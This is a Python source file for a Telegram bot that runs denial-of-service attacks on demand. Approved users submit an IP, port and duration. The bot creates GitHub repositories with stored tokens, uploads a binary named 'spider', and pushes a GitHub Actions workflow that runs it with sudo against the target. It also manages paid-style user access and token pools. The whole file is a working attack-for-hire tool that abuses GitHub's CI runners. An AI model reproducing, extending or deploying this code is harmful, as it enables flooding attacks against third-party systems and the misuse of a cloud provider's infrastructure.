"""
RAILWAY OPTIMIZED - COMPLETE WORKING VERSION
"""

import os
import sys
import json
import logging
import threading
import time
import uuid
import random
import string
from datetime import datetime
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass, asdict
from concurrent.futures import ThreadPoolExecutor, as_completed

# ==================== FIX: Try importing telegram ====================
try:
    from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
    from telegram.ext import (
        Application, CommandHandler, ContextTypes, 
        MessageHandler, filters, ConversationHandler,
        CallbackQueryHandler
    )
except ImportError:
    print("🔄 Installing python-telegram-bot...")
    os.system("pip install python-telegram-bot==20.7")
    from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
    from telegram.ext import (
        Application, CommandHandler, ContextTypes, 
        MessageHandler, filters, ConversationHandler,
        CallbackQueryHandler
    )

from github import Github, GithubException
from dotenv import load_dotenv
import aiohttp
import ujson as json

# ==================== CONFIG ====================
load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN")
if not BOT_TOKEN:
    print("❌ BOT_TOKEN not set!")
    sys.exit(1)

ADMIN_IDS = [int(x.strip()) for x in os.getenv("ADMIN_IDS", "7971134405").split(",")]
MAX_WORKERS = int(os.getenv("MAX_WORKERS", "30"))
ATTACK_TIMEOUT = int(os.getenv("ATTACK_TIMEOUT", "3600"))
COOLDOWN_DEFAULT = int(os.getenv("COOLDOWN_DEFAULT", "40"))
MAX_ATTACKS_DEFAULT = int(os.getenv("MAX_ATTACKS_DEFAULT", "100"))

# Data directory
DATA_DIR = "/app/data" if os.getenv("RAILWAY") else "data"
os.makedirs(DATA_DIR, exist_ok=True)

print(f"📁 Data dir: {DATA_DIR}")

# ==================== DATA MANAGER ====================
class DataManager:
    @classmethod
    def _path(cls, f):
        return os.path.join(DATA_DIR, f)
    
    @classmethod
    def load(cls, f, default=None):
        path = cls._path(f)
        if os.path.exists(path):
            try:
                with open(path, 'r') as file:
                    return json.load(file)
            except:
                return default or {}
        return default or {}
    
    @classmethod
    def save(cls, f, data):
        path = cls._path(f)
        with open(path, 'w') as file:
            json.dump(data, file, indent=2)

# ==================== GITHUB MANAGER ====================
class GitHubManager:
    def __init__(self):
        self.tokens = DataManager.load('github_tokens.json', [])
        self.repo_names = [
            "spider", "thor", "antman", "catwoman", "batman", "ironman",
            "superman", "flash", "hulk", "loki", "deadpool", "wolverine",
            "venom", "thanos", "drstrange", "blackpanther", "captainamerica",
            "hawkeye", "falcon", "vision", "aquaman", "cyborg"
        ]
        self.used = set()
    
    def get_repo_name(self):
        avail = [r for r in self.repo_names if r not in self.used]
        if not avail:
            self.used.clear()
            avail = self.repo_names
        name = random.choice(avail)
        self.used.add(name)
        return f"{name}-{uuid.uuid4().hex[:8]}"
    
    def start_attack(self, token, repo, target):
        try:
            g = Github(token)
            repo_obj = g.get_repo(repo)
            yml = f"""name: Attack
on: [push]
jobs:
  attack:
    runs-on: ubuntu-24.04
    steps:
    - uses: actions/checkout@v3
    - run: chmod +x spider
    - run: sudo ./spider {target.ip} {target.port} {target.duration} 350
"""
            try:
                existing = repo_obj.get_contents(".github/workflows/main.yml")
                repo_obj.update_file(".github/workflows/main.yml", f"Attack {target.ip}", yml, existing.sha)
            except:
                repo_obj.create_file(".github/workflows/main.yml", f"Attack {target.ip}", yml)
            return True
        except:
            return False
    
    def stop_all(self, token, repo):
        try:
            g = Github(token)
            repo_obj = g.get_repo(repo)
            cancelled = 0
            for status in ['queued', 'in_progress', 'pending']:
                for wf in repo_obj.get_workflow_runs(status=status):
                    try:
                        wf.cancel()
                        cancelled += 1
                    except:
                        pass
            return cancelled
        except:
            return 0
    
    def upload_binary(self, token, repo, content):
        try:
            g = Github(token)
            repo_obj = g.get_repo(repo)
            try:
                existing = repo_obj.get_contents("spider")
                repo_obj.update_file("spider", "Update binary", content, existing.sha)
            except:
                repo_obj.create_file("spider", "Upload binary", content)
            return True
        except:
            return False
    
    def create_repo(self, token):
        try:
            g = Github(token)
            user = g.get_user()
            name = self.get_repo_name()
            try:
                repo = user.get_repo(name)
            except:
                repo = user.create_repo(name, description="Bot", private=False, auto_init=True)
            return f"{user.login}/{name}"
        except:
            return None

# ==================== DATA CLASSES ====================
@dataclass
class AttackTarget:
    ip: str
    port: int
    duration: int
    user_id: int = 0

@dataclass
class AttackStatus:
    target: AttackTarget
    started_at: float
    estimated_end: float
    repos_success: int = 0
    repos_failed: int = 0
    status: str = "running"
    
    @property
    def elapsed(self):
        return int(time.time() - self.started_at)
    
    @property
    def remaining(self):
        return max(0, int(self.estimated_end - time.time()))

# ==================== ATTACK ENGINE ====================
class AttackEngine:
    def __init__(self):
        self.github = GitHubManager()
        self.current = None
        self.cooldown = 0
        self.lock = threading.Lock()
    
    def can_attack(self):
        with self.lock:
            if time.time() < self.cooldown:
                return False, f"⏳ Cooldown: {int(self.cooldown - time.time())}s"
            if self.current and self.current.status == "running":
                return False, "⚡ Attack running!"
            return True, "Ready"
    
    def start(self, target):
        with self.lock:
            status = AttackStatus(
                target=target,
                started_at=time.time(),
                estimated_end=time.time() + target.duration
            )
            self.current = status
            threading.Thread(target=self._execute, args=(target, status), daemon=True).start()
            return status
    
    def _execute(self, target, status):
        try:
            tokens = self.github.tokens
            if not tokens:
                status.status = "failed"
                return
            
            success = 0
            failed = 0
            
            with ThreadPoolExecutor(max_workers=min(MAX_WORKERS, len(tokens))) as executor:
                futures = []
                for t in tokens:
                    repo = t.get('repo')
                    if not repo:
                        repo = self.github.create_repo(t['token'])
                    if repo:
                        futures.append(executor.submit(
                            self.github.start_attack,
                            t['token'], repo, target
                        ))
                
                for future in as_completed(futures):
                    if future.result():
                        success += 1
                    else:
                        failed += 1
            
            status.repos_success = success
            status.repos_failed = failed
            status.status = "completed" if success > 0 else "failed"
            
            with self.lock:
                self.cooldown = time.time() + COOLDOWN_DEFAULT
                
        except Exception as e:
            status.status = "failed"
    
    def stop(self):
        with self.lock:
            if not self.current:
                return 0
            total = 0
            with ThreadPoolExecutor(max_workers=min(MAX_WORKERS, len(self.github.tokens))) as executor:
                futures = []
                for t in self.github.tokens:
                    repo = t.get('repo')
                    if repo:
                        futures.append(executor.submit(
                            self.github.stop_all,
                            t['token'], repo
                        ))
                for future in as_completed(futures):
                    total += future.result()
            self.current.status = "stopped"
            return total

# ==================== BOT ====================
engine = AttackEngine()

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    owners = DataManager.load('owners.json', {})
    approved = DataManager.load('approved_users.json', {})
    
    if str(user_id) in owners or str(user_id) in approved:
        await update.message.reply_text(
            f"🔥 **BOT ACTIVE**\n\n"
            f"👤 User: @{update.effective_user.username or str(user_id)}\n"
            f"🆔 ID: `{user_id}`\n\n"
            f"**Commands:**\n"
            f"• /attack <ip> <port> <duration>\n"
            f"• /status\n"
            f"• /stop\n"
            f"• /myaccess"
        )
    else:
        pending = DataManager.load('pending_users.json', [])
        if str(user_id) not in [str(u.get('user_id')) for u in pending]:
            pending.append({'user_id': user_id, 'username': str(update.effective_user.username), 'time': time.time()})
            DataManager.save('pending_users.json', pending)
        await update.message.reply_text(
            f"⏳ **Pending**\n🆔 `{user_id}`\nWait for approval."
        )

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    owners = DataManager.load('owners.json', {})
    approved = DataManager.load('approved_users.json', {})
    
    if str(user_id) not in owners and str(user_id) not in approved:
        await update.message.reply_text("❌ Unauthorized")
        return
    
    args = context.args
    if len(args) < 3:
        await update.message.reply_text("❌ /attack <ip> <port> <duration>")
        return
    
    try:
        ip = args[0]
        port = int(args[1])
        duration = int(args[2])
        
        if duration > ATTACK_TIMEOUT:
            await update.message.reply_text(f"⚠️ Max: {ATTACK_TIMEOUT}s")
            return
        
        target = AttackTarget(ip=ip, port=port, duration=duration, user_id=user_id)
        can, msg = engine.can_attack()
        if not can:
            await update.message.reply_text(msg)
            return
        
        status = engine.start(target)
        await update.message.reply_text(
            f"🚀 **Attack Started!**\n\n"
            f"🎯 `{ip}:{port}`\n"
            f"⏱ {duration}s\n"
            f"📦 {len(engine.github.tokens)} repos\n\n"
            f"Use /status for updates"
        )
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    status = engine.current
    if not status or status.status != "running":
        if time.time() < engine.cooldown:
            await update.message.reply_text(f"⏳ Cooldown: {int(engine.cooldown - time.time())}s")
        else:
            await update.message.reply_text("✅ No active attack")
        return
    
    progress = 1 - (status.remaining / status.target.duration)
    bar = "█" * int(20 * progress) + "░" * (20 - int(20 * progress))
    
    await update.message.reply_text(
        f"⚡ **Attack Status**\n\n"
        f"🎯 `{status.target.ip}:{status.target.port}`\n"
        f"⏱ {status.elapsed}s / {status.target.duration}s\n"
        f"📊 {bar} {int(progress*100)}%\n"
        f"✅ {status.repos_success} | ❌ {status.repos_failed}\n"
        f"⏳ {status.remaining}s"
    )

async def stop_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not engine.current:
        await update.message.reply_text("❌ No attack")
        return
    stopped = engine.stop()
    await update.message.reply_text(f"⏹ **Stopped**\n✅ {stopped} cancelled")

async def myaccess(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    owners = DataManager.load('owners.json', {})
    approved = DataManager.load('approved_users.json', {})
    
    if str(user_id) in owners:
        role = "👑 Owner"
    elif str(user_id) in approved:
        role = "✅ User"
    else:
        role = "⏳ Pending"
    
    await update.message.reply_text(
        f"📋 **Your Access**\n\n"
        f"🆔 `{user_id}`\n"
        f"👤 {role}\n"
        f"⚡ Workers: {MAX_WORKERS}"
    )

async def add(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    owners = DataManager.load('owners.json', {})
    
    if str(user_id) not in owners:
        await update.message.reply_text("❌ Unauthorized")
        return
    
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("❌ /add <user_id> <days>")
        return
    
    try:
        new_user = int(args[0])
        days = int(args[1])
        approved = DataManager.load('approved_users.json', {})
        approved[str(new_user)] = {
            'added_by': user_id,
            'expiry': time.time() + (days * 86400) if days > 0 else 'Lifetime',
            'days': days
        }
        DataManager.save('approved_users.json', approved)
        await update.message.reply_text(f"✅ User `{new_user}` added for {days} days")
    except:
        await update.message.reply_text("❌ Invalid input")

async def remove(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    owners = DataManager.load('owners.json', {})
    
    if str(user_id) not in owners:
        await update.message.reply_text("❌ Unauthorized")
        return
    
    if len(context.args) < 1:
        await update.message.reply_text("❌ /remove <user_id>")
        return
    
    try:
        user_to_remove = int(context.args[0])
        approved = DataManager.load('approved_users.json', {})
        if str(user_to_remove) in approved:
            del approved[str(user_to_remove)]
            DataManager.save('approved_users.json', approved)
            await update.message.reply_text(f"✅ User `{user_to_remove}` removed")
        else:
            await update.message.reply_text("❌ Not found")
    except:
        await update.message.reply_text("❌ Invalid input")

async def userslist(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    owners = DataManager.load('owners.json', {})
    
    if str(user_id) not in owners:
        await update.message.reply_text("❌ Unauthorized")
        return
    
    approved = DataManager.load('approved_users.json', {})
    if not approved:
        await update.message.reply_text("📭 No users")
        return
    
    msg = "👥 **Users**\n" + "="*20 + "\n"
    for uid, data in approved.items():
        exp = data.get('expiry', '?')
        if exp != 'Lifetime':
            try:
                days_left = int((float(exp) - time.time()) / 86400)
                exp = f"{days_left}d"
            except:
                pass
        msg += f"🆔 `{uid}` - {exp}\n"
    msg += f"\n📊 Total: {len(approved)}"
    await update.message.reply_text(msg)

async def addtoken(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    owners = DataManager.load('owners.json', {})
    
    if str(user_id) not in owners:
        await update.message.reply_text("❌ Unauthorized")
        return
    
    if len(context.args) < 1:
        await update.message.reply_text("❌ /addtoken <github_token>")
        return
    
    token = context.args[0]
    try:
        g = Github(token)
        user = g.get_user()
        tokens = DataManager.load('github_tokens.json', [])
        for t in tokens:
            if t.get('token') == token:
                await update.message.reply_text("❌ Already exists")
                return
        tokens.append({'token': token, 'username': user.login})
        DataManager.save('github_tokens.json', tokens)
        engine.github.tokens = tokens
        await update.message.reply_text(f"✅ Token added for @{user.login}")
    except Exception as e:
        await update.message.reply_text(f"❌ {str(e)}")

async def tokens(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    owners = DataManager.load('owners.json', {})
    
    if str(user_id) not in owners:
        await update.message.reply_text("❌ Unauthorized")
        return
    
    tokens = DataManager.load('github_tokens.json', [])
    if not tokens:
        await update.message.reply_text("📭 No tokens")
        return
    
    msg = "🔑 **Tokens**\n" + "="*20 + "\n"
    for i, t in enumerate(tokens, 1):
        msg += f"{i}. @{t.get('username', 'unknown')}\n"
    await update.message.reply_text(msg)

async def removetoken(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    owners = DataManager.load('owners.json', {})
    
    if str(user_id) not in owners:
        await update.message.reply_text("❌ Unauthorized")
        return
    
    if len(context.args) < 1:
        await update.message.reply_text("❌ /removetoken <index>")
        return
    
    try:
        idx = int(context.args[0]) - 1
        tokens = DataManager.load('github_tokens.json', [])
        if 0 <= idx < len(tokens):
            removed = tokens.pop(idx)
            DataManager.save('github_tokens.json', tokens)
            engine.github.tokens = tokens
            await update.message.reply_text(f"✅ Removed @{removed.get('username', 'unknown')}")
        else:
            await update.message.reply_text("❌ Invalid index")
    except:
        await update.message.reply_text("❌ Invalid input")

# ==================== MAIN ====================
def main():
    app = Application.builder().token(BOT_TOKEN).build()
    
    # Commands
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("attack", attack))
    app.add_handler(CommandHandler("status", status_cmd))
    app.add_handler(CommandHandler("stop", stop_cmd))
    app.add_handler(CommandHandler("myaccess", myaccess))
    app.add_handler(CommandHandler("add", add))
    app.add_handler(CommandHandler("remove", remove))
    app.add_handler(CommandHandler("userslist", userslist))
    app.add_handler(CommandHandler("addtoken", addtoken))
    app.add_handler(CommandHandler("tokens", tokens))
    app.add_handler(CommandHandler("removetoken", removetoken))
    
    print("🔥 BOT RUNNING ON RAILWAY")
    print("="*30)
    print(f"👤 Users: {len(DataManager.load('approved_users.json', {}))}")
    print(f"🔑 Tokens: {len(DataManager.load('github_tokens.json', []))}")
    print("="*30)
    
    app.run_polling()

if __name__ == "__main__":
    main()
